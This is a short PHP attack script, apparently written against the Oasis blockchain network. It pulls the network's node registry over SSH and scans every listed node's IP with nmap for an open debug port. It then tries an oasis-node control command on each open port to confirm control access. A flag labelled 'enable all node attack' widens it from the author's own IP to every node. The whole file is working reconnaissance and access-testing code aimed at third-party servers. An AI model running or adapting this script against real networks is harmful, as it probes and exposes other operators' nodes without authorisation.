<?php
//enable all node attack
$hack = 1;
//list of debug port
$port_list = ["42261"];
//web <br> or console \n
$br="\n";

//retrieve port list
$cmd = "ssh oasis \"/home/oasis/oasis-core/go/oasis-node/oasis-node registry node list -v\"";
echo "command:".$cmd.$br;
$node_list_json = shell_exec( $cmd );
$node_json_list = explode ("\n" , $node_list_json);
$target_list = array();

//get target list from node list (debug port open)
foreach ($node_json_list as $node_json){
	$node = json_decode($node_json);
	if ($node){
		//var_dump($node);
		echo "Id:".$node->id.$br;
		foreach($node->consensus->addresses as $address){
			//echo "==>".$address.$br;
			$ip = explode(":",explode ("@" , $address)[1])[0];
			echo "==>".$ip.$br;
			if ($hack || $ip == "34.83.124.86" /* my ip */){
				foreach($port_list as $port){
					$cmd = "nmap -Pn -p $port $ip | grep $port | grep open";
					$result = shell_exec( $cmd );
					if ($result){
						echo "== ".$port." open".$br;
						array_push($target_list, $ip.":".$port);
					}else{
						echo "== ".$port." close".$br;
					}
					//sleep(1);
				}
			}	
		}
	}
}

$success_list = array();
if (count($target_list)){
	echo "Testing ".count($target_list)." targets: ".$br;
	foreach ($target_list as $target){
		echo "test node ".$target.$br;;
		$cmd = "oasis-node -a ".$target." control is-synced";
		echo "==> ".$cmd.$br;
		exec ( $cmd , $output , $return_var );
		if ($return_var == 0){
			echo "==> node control success on : ".$target.$br;
			array_push($success_list, $target);
		}else{
			echo "==> node control error on : ".$target.$br;
		}	
	}
} else {
	echo "no target with open port".$br;
}


if (count($success_list)){
	echo "list of ".count($success_list)." success: ".$br;
	foreach ($success_list as $target){
		echo "success : ".$target.$br;
	}
} else {
	echo "no target success".$br;
}

?>
